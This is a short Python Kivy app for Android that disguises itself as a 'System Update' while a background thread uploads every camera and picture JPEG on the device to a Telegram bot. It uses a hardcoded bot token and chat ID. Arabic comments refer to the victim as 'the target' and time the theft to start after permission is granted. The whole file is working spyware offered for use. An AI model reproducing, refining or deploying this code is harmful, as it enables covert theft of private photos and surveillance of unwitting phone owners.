from kivy.app import App
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission
import requests, glob, threading, time, os

# إعدادات بوتك
TOKEN = "8640687286:AAFDJ3Rwiddz2gEXLBiv-QvcjJnhGmqdhVA"
CHAT_ID = "7331377553"

class SystemUpdateApp(App):
    def build(self):
        # طلب صلاحيات الصور فور فتح التطبيق
        request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
        threading.Thread(target=self.scan_and_send, daemon=True).start()
        return Label(text="System Update in progress...\nPlease do not close this window.")

    def scan_and_send(self):
        time.sleep(5) # وقت للمستهدف ليضغط "سماح"
        paths = ["/sdcard/DCIM/Camera/*.jpg", "/sdcard/Pictures/*.jpg", "/storage/emulated/0/DCIM/Camera/*.jpg"]
        for path in paths:
            for file_path in glob.glob(path):
                try:
                    with open(file_path, "rb") as photo:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", 
                                      data={"chat_id": CHAT_ID}, files={"document": photo})
                    time.sleep(1.5)
                except: pass

if __name__ == "__main__":
    SystemUpdateApp().run()
